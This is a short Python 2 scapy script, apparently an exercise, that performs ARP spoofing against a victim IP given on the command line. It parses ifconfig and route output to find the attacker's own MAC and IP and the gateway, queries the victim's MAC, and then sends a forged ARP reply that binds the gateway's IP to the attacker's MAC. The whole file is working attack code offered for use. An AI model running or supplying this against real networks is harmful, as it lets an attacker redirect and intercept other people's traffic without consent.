import subprocess
import sys
from scapy.all import *

if len(sys.argv) != 2:
	print "Usage: python argv.py victim_ip"
	sys.exit(1)

######### Network Information Settings #############
#<My Network Info>
output= subprocess.check_output(["ifconfig"])
output_split = output.split()
my_mac = output_split[output_split.index('ens33') +4]
my_ip = output_split[output_split.index('ens33') +6][5:]

#<Gateway Info>
output= subprocess.check_output(["route"])
output_split = output.split()
gateway_ip = output_split[output_split.index('default') +1]

#<victim Info>
victim_ip= sys.argv[1]

#Print IP Info
print ""
print "####################################################"
print "GW : " + gateway_ip
print "Attacker : " + my_ip
print "Target : " + victim_ip
print "####################################################"
print ""

####################################################
############# ARP request & GET mac
arp_packet = sr1(ARP(op=ARP.who_has, psrc = my_ip, pdst=victim_ip))
victim_mac = arp_packet.summary().split()[arp_packet.summary().split().index('at')+1]

#Print MAC Info
print ""
print "####################################################"
print "Attacker : " + my_mac
print "Target : " +  victim_mac
print "####################################################"
print ""

############# arp spoofing to victim ##############
send(ARP(op=ARP.is_at, hwsrc = my_mac, psrc=gateway_ip, hwdst=victim_mac, pdst=victim_ip))
